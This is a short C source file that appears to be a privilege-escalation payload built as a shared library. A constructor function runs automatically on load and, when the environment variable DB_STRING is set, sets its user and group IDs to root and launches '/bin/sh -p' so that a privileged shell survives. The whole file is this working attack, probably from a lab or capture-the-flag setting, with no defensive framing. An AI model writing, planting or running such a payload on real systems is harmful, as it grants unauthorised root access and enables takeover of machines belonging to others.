#include <unistd.h>
#include <stdlib.h>

void __attribute__((constructor)) init_shell(){
    char* setenvalue;

    setenvalue = getenv("DB_STRING");
    
    if (setenvalue != NULL){        
        int retuid = setreuid(0, 0);
        int retgid = setregid(0, 0);

        char *argv[] = {"/bin/sh", "-p", NULL};
        char *envp[] = {NULL};

        execve("/bin/sh", argv, envp);
    }   
}